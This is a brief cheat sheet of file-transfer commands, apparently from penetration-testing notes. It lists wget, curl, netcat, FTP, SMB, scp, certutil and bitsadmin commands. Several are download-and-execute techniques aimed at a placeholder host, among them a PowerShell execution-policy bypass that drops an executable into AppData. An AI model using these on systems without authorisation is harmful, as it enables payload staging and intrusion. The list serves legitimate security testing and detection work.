# File Transfer

| Command |
|---------|
| `wget http://$IP/file -O /tmp/test.tmp` |
| `curl http://$IP/file` |
| `fetch http://$IP/file` |
| `nc $IP $port > outfile` |
| `nc -lnvp $port < infile` |
| `ftp -s:input.txt` |
| `ftp $ip` |
| `get $filename` |
| `sudo apt install python-pyftpdlib` |
| `sudo python -m pyftpdlib -p 21` |
| `python -m SimpleHTTPServer 80` |
| `python -m http.server 80` |
| `curl -O http://$ip/putty.exe` |
| `python smbserver.py ata /root/share` |
| `[WIN+R] \\$ip` |
| `apt install smbclient` |
| `smbclient -L $ip` |
| `smbclient //$ip/ata` |
| `(new-object System.Net.WebClient).DownloadFile('//$ip/putty.exe', 'd:\\data\\putty.exe')` |
| `bitsadmin /transfer job //example.com/path/putty.exe F:\\putty.exe` |
| `php -S 0.0.0.0:80` |
| `scp $filename user@host:~/path_dir` |
| `scp $filename $username@$ip:~/` |
| `python -m pyftpdlib 21` |
| `ftp $ip` |
| `bitsadmin /transfer download /priority normal http://$ip/file C:\\output\\path` |
| `powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$filename','C:\\Users\\user\\AppData\\Local\\ack.exe'));}”` |
| `certutil -urlcache -split -f “http://$ip/$filename" $filename` |
| `echo $storageDir = $pwd > wget.ps1` |
| `echo $webclient = New-Object System.Net.WebClient >> wget.ps1` |
| `echo $url = "http://$ip/$filename" >> wget.ps1` |
| `echo $filename = "filename" >> wget.ps1` |
| `echo $webclient.DownloadFile($url,$filename) >> wget.ps1` |
| `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename` |
